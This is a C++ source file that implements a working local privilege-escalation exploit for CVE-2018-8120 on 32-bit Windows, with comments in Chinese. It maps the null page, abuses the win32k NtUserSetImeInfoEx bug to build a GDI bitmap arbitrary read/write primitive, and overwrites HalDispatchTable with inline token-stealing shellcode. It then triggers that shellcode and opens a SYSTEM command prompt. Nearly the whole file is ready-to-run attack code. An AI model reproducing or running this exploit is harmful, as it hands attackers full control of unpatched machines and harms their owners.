#include <windows.h>
#include <iostream>
#include <Psapi.h>
HBITMAP hManagerBitmap = NULL;
HBITMAP hWorkerBitmap = NULL;
typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);

typedef
NTSTATUS
(WINAPI *pfNtAllocateVirtualMemory) (
	HANDLE       ProcessHandle,
	PVOID       *BaseAddress,
	ULONG_PTR    ZeroBits,
	PSIZE_T      RegionSize,
	ULONG        AllocationType,
	ULONG        Protect
	);

pfNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define IM_UI_CLASS_SIZE        16
#define IM_DESC_SIZE            50
#define IM_FILE_SIZE            80

typedef struct {
	DWORD       dwPrivateDataSize;
	DWORD       fdwProperty;
	DWORD       fdwConversionCaps;
	DWORD       fdwSentenceCaps;
	DWORD       fdwUICaps;
	DWORD       fdwSCSCaps;
	DWORD       fdwSelectCaps;
} tagIMEINFO;
typedef struct
{
	ULONG pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	ULONG pUserAddress;
} GDICELL_32, *PGDICELL_32;
typedef struct {
	HKL         hkl;
	tagIMEINFO  ImeInfo;
	WCHAR       wszUIClass[IM_UI_CLASS_SIZE];
	DWORD       fdwInitConvMode;
	BOOL        fInitOpen;
	BOOL        fLoadFlag;
	DWORD       dwProdVersion;
	DWORD       dwImeWinVersion;
	WCHAR       wszImeDescription[IM_DESC_SIZE];
	WCHAR       wszImeFile[IM_FILE_SIZE];
	CHAR        fSysWow64Only : 1;
	BYTE        fCUASLayer : 1;
} tagIMEINFOEX;
VOID shellCode()
{
	__asm
	{
		pushad
		mov eax, fs:[124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4

		find_sys_pid :
					 mov eax, [eax + 0b8h]
					 sub eax, 0b8h
					 cmp[eax + 0b4h], edx
					 jnz find_sys_pid

					 mov edx, [eax + 0f8h]
					 mov[ecx + 0f8h], edx
					 popad
	}
}

/*
* getKernelBase:
*	[+] 获取 ntoskrnl.exe 的基地址
*/
LPVOID getKernelBase()
{
	LPVOID  lpImageBase[1024];
	DWORD cbNeeded;
	TCHAR baseName[1024];
	// 使用EnumDeviceDriver来获取内核基地址
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &cbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		// 获取基地址的名字
		GetDeviceDriverBaseNameA(lpImageBase[i], baseName, 48);

		if (!strcmp(baseName, "ntkrnlpa.exe"))
		{
			std::cout << "[+] basename: " << baseName << std::endl;
			std::cout << "[+] ntoskrnl.exe at kernel space: " << lpImageBase[i] << std::endl;
			return lpImageBase[i];
		}

	}

	return NULL;
}


/*
* getHalDispatchOffset4:
*	[+] 获取HalDispatchtable第二项的地址, 以执行shellcode
*/
DWORD32 getHalDispatchOffset4()
{
	// 获取xxx在kernel space 的基地址
	PVOID pKernelBase = getKernelBase();

	// 获取xxx在user space 的基地址
	HMODULE hUserSpaceBase = LoadLibrary("ntkrnlpa.exe");

	// 获取HalDispatchTable 在user space的地址
	PVOID pUserSpaceAddr = GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	// 算出其在 kernel space的偏移
	return (DWORD32)pKernelBase + ((DWORD32)pUserSpaceAddr - (DWORD32)hUserSpaceBase) + 0x4;
}

/*
* popCmdToConfirm:
*	[+] 弹出cmd窗口验证提权是否成功
*	[+] 来源: https://github.com/Cn33liz/HSEVD-ArbitraryOverwriteGDI/blob/master/HS-ArbitraryOverwriteGDI/HS-ArbitraryOverwriteGDI.c#L236
*/
VOID popCmdToConfirm()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
}

DWORD32 getCurrentPEB()
{
	DWORD32 pebAddr;
	_asm
	{
		mov eax, fs:[0x30]
		mov pebAddr, eax
	}
	return pebAddr;
}

VOID readOOB(DWORD32 whereRead, PVOID whatValue, int len)
{
	// 使用manager的pvScan改变worker的pvScan地址
	SetBitmapBits(hManagerBitmap, len, &whereRead);	// 改变任意地址
	GetBitmapBits(hWorkerBitmap, len, whatValue);	// 读
}

/*
* writeOOB:
*	[+] 对任意地址进行写操作
*	[+] whereRead: 写的地址
*	[+] whatValue: 写入的值
*/
VOID writeOOB(DWORD32 whereWrite, PVOID whatValue, int len)
{
	//__debugbreak();
	SetBitmapBits(hManagerBitmap, len, &whereWrite);
	//__debugbreak();
	SetBitmapBits(hWorkerBitmap, len, &whatValue);	// 写
}

DWORD32 getGDIAddrByHandle(HANDLE handle)
{
	DWORD32 pebAddr = getCurrentPEB();	// 获取当前进程PEB地址

										//std::cout << "[+] peb Addr at: " << std::hex << pebAddr << std::endl;

	DWORD32 GdiSharedHandleTable = *(DWORD32*)(pebAddr + 0x94);	// 获取GDISharedHandleTable的地址

	//std::cout << "[+] GdiSharedHandleTable Addr at: " << std::hex << GdiSharedHandleTable << std::endl;


	GDICELL_32 leakCeil = *((PGDICELL_32)((PUCHAR)GdiSharedHandleTable + LOWORD(handle) * sizeof(GDICELL_32)));	// 获取其地址

																												//std::cout << "[+] Debug 1" << std::endl;

	return (DWORD32)leakCeil.pKernelAddress;
}

static
BOOL
__declspec(naked)
xxNtUserSetImeInfoEx(tagIMEINFOEX *imeInfoEx)
{
	__asm { mov eax, 1226h };
	__asm { lea edx, [esp + 4] };
	__asm { int 2eh };
	__asm { ret };
}

BOOL init_write_what_where()
{
	tagIMEINFOEX        userInput = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	SetProcessWindowStation(CreateWindowStation(NULL, NULL, NULL, &sa));
	char *buf = (char *)malloc(0x100);
	hManagerBitmap = CreateBitmap(0x101, 2, 1, 8, buf);
	hWorkerBitmap = CreateBitmap(0x101, 2, 1, 8, buf);
	DWORD hManagerPvScan0 = getGDIAddrByHandle(hManagerBitmap) + 0x30;
	DWORD hWorkerPvScan0 = getGDIAddrByHandle(hWorkerBitmap) + 0x30;
	DWORD* fakeWriteWhatWhereData = (DWORD*)0x0;
	std::cout << "[+} hmanager pvscan0 : " << std::hex << hManagerPvScan0 << std::endl;
	std::cout << "[+] hworkerPvScan0 : " << std::hex << hWorkerPvScan0 << std::endl;
	// 0x2c填充重要的数据
	*(DWORD *)((PBYTE)&userInput + 0x0) = hWorkerPvScan0;
	*(DWORD *)((PBYTE)&userInput + 0x4) =	0x104;
	*(DWORD *)((PBYTE)&userInput + 0x8) =	 0x00001b97;
	*(DWORD *)((PBYTE)&userInput + 0xC) = 0x00000003;
	*(DWORD *)((PBYTE)&userInput + 0x10) = 0x00010000;
	*(DWORD *)((PBYTE)&userInput + 0x18) = 0x04800200;
	std::cout << "[+] fake data" << std::endl;
	// 这两个地方如果相等就欧克 能跳过for循环
	*(DWORD*)((PUCHAR)fakeWriteWhatWhereData + 0x14) = hWorkerPvScan0;	
	*(DWORD*)((PUCHAR)fakeWriteWhatWhereData + 0x2c) = hManagerPvScan0;	// 这里是write_wahere, 放haldispatchtable刚刚好 // 不行 后面不为0
	std::cout << "[+] write shellcode to haldisptchtable" << std::endl;
	// 触发漏洞
	xxNtUserSetImeInfoEx(&userInput);
	return FALSE;
}

VOID getSystemShell()
{
	DWORD interVal = 0;
	// find haldispatchtable+0x4 and replace it
	DWORD32 halHooked = getHalDispatchOffset4();
	std::cout << "[+] haldispatchtable offset 4 at: " << std::hex << halHooked << std::endl;
	// 获取基地址

	// 执行shellcode
	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
	//__debugbreak();
	writeOOB(halHooked, (PVOID)&shellCode, sizeof(DWORD32));
	NtQueryIntervalProfile(0x1234, &interVal);
}

VOID makeNullpageValid()
{

	*(FARPROC *)&NtAllocateVirtualMemory = GetProcAddress(GetModuleHandleW(L"ntdll"),
		"NtAllocateVirtualMemory");
	if (NtAllocateVirtualMemory == NULL)
	{
		return ;
	}
	PVOID               fakeAddr = (PVOID)1;
	SIZE_T              MemSize = 0x1000;
	if (!NT_SUCCESS(NtAllocateVirtualMemory(HANDLE(-1),
		&fakeAddr,
		0,
		&MemSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE)) || fakeAddr != NULL)
	{
		std::cout << "[-]Memory alloc failed!" << std::endl;
		return ;
	}
}

int main()
{
	std::cout << "[+] cve-2018-8120 exploit" << std::endl;

	makeNullpageValid();

	if (!init_write_what_where())
	{
		std::cout << "[+] write what where initialized failed" << std::endl;
	}
	getSystemShell();
	popCmdToConfirm();
	return 0;
}